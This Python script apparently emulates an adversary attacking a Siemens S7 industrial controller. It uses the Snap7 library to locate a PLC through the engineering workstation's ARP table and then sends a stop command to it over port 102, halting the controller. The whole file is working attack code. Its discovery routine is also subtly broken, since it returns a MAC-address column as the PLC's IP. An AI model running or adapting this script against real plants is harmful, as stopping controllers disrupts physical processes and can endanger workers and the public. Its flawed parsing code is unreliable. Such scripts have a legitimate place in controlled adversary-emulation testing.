import snap7
import subprocess
import time
import logging
import os
import socket

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Configuration - These could be read from a config file
ENGINEERING_WORKSTATION_IP = "YOUR_ENGINEERING_WORKSTATION_IP" # Replace with the actual IP
PLC_RACK = 0  # PLC Rack Number (Consult PLC documentation)
PLC_SLOT = 1  # PLC Slot Number (Consult PLC documentation)
S7_PORT = 102 # Standard S7 Port

def find_plc_ip(engineering_workstation_ip):
    """
    Attempts to discover the PLC IP address by examining the engineering workstation's ARP table.
    This assumes the engineering workstation has recently communicated with the PLC.
    """
    logging.info("Attempting to discover PLC IP address...")
    try:
        # Execute arp command on Windows to get ARP table
        arp_process = subprocess.Popen(['arp', '-a', engineering_workstation_ip],
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
        arp_output, arp_error = arp_process.communicate()

        if arp_error:
            logging.error(f"Error executing arp command: {arp_error.decode()}")
            return None

        arp_output_str = arp_output.decode()
        # Parse the ARP table output for the PLC's IP
        for line in arp_output_str.splitlines():
            parts = line.split()
            if len(parts) > 1 and engineering_workstation_ip in parts[0]:
                plc_ip = parts[1]
                logging.info(f"Found PLC IP address: {plc_ip}")
                return plc_ip

        logging.warning("PLC IP address not found in ARP table.  Ensure the engineering workstation has recently communicated with the PLC, or manually provide the PLC IP.")
        return None

    except Exception as e:
        logging.error(f"Error discovering PLC IP: {e}")
        return None


def restart_plc(plc_ip):
    """
    Attempts to restart the PLC using the Snap7 library. This simulates an adversary
    using the S7 protocol to issue a restart command.

    THIS IS A HIGHLY DISRUPTIVE ACTION AND SHOULD ONLY BE PERFORMED IN A CONTROLLED ENVIRONMENT.
    """
    try:
        logging.warning(f"Attempting to restart PLC at {plc_ip}.  THIS WILL DISRUPT OPERATIONS.")

        plc = snap7.client.Client()
        plc.connect(plc_ip, PLC_RACK, PLC_SLOT)

        # Perform a PLC Stop command (soft restart)
        # Note:  This might require specific PLC configurations and user privileges.
        #       In some cases, you might need to authenticate first.
        #       Direct "cold restart" commands may not be available through Snap7.
        try:
            plc.plc_stop()
            logging.info("PLC Stop command sent successfully.")
            time.sleep(5) # give the PLC time to stop.  Adjust as needed.
            # In some cases a PLC stop is all that is needed, so it will start itself.
            # For more robust restarts, you need to find more command and functions
            #plc.plc_cold_restart()
            #logging.info("PLC Cold Restart command sent successfully.")

        except Exception as e:
            logging.error(f"Error sending PLC stop command: {e}")
            return False # Failed to restart

        finally:
            plc.disconnect()  # Always disconnect

        logging.info("PLC restart attempt completed.")
        return True

    except Exception as e:
        logging.error(f"Error connecting to PLC or during restart: {e}")
        return False


if __name__ == "__main__":
    # Step 1: Discover PLC IP address
    plc_ip_address = find_plc_ip(ENGINEERING_WORKSTATION_IP)

    if not plc_ip_address:
        print("Could not discover PLC IP address. Please manually provide it, and update the SCRIPT!")
        # Optionally, prompt the user to enter the IP address.
        plc_ip_address = input("Enter PLC IP address: ")
        if not plc_ip_address:
            print("PLC IP address not provided. Exiting.")
            exit()

    # Step 2: Attempt to restart the PLC
    if restart_plc(plc_ip_address):
        print("PLC restart attempt initiated.")
    else:
        print("PLC restart attempt failed.")